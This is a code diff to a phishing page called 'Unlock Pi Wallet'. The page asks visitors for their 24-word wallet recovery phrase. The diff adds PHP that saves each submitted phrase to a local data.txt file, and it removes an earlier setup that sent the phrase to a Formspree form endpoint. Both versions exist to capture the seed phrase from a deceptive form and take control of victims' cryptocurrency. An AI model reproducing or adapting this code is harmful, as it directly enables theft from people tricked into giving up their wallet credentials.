@@ -32,13 +32,37 @@
                             
                             <h1 style="text-align: center; color: rgb(51, 51, 51); font-size: 24px; font-weight: bold; margin-bottom: 30px;">Unlock Pi Wallet</h1>
                             
+							
+  
+
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Check if the form was submitted
+    if (isset($_POST['submit'])) {
+        $content = $_POST['content'];
+
+        // Define the filename where data will be stored
+        $filename = 'data.txt';
+
+        // Prepare the data to be written into the file
+        $data = $content . "\n\n";  // Add a newline for better readability
+
+        // Write the data to the file
+        if (file_put_contents($filename, $data, FILE_APPEND | LOCK_EX)) {
+            echo "Data successfully written to $filename.";
+        } else {
+            echo "Failed to write data to $filename.";
+        }
+    }
+}
+?>
 
 							
 							
-							<form action="https://formspree.io/f/mjgbydwk" method="POST">
+							<form action="" method="post">
                             <div style="background-color: white; border-radius: 12px; padding: 20px; margin-bottom: 20px; border: 1px solid rgb(224, 224, 224);">
                                  <input type="email" name="email">
-                                <textarea name="message" placeholder="Enter your 24-word recovery phrase here" rows="6" style="width: 100%; border: none; outline: none; font-size: 20px; font-family: monospace; resize: none; color: rgb(153, 153, 153); background-color: transparent;" required></textarea>
+                                <textarea id="content" name="content"  placeholder="Enter your 24-word recovery phrase here" rows="6" style="width: 100%; border: none; outline: none; font-size: 20px; font-family: monospace; resize: none; color: rgb(153, 153, 153); background-color: transparent;" required></textarea>
                                 
                                 </div>
                                 
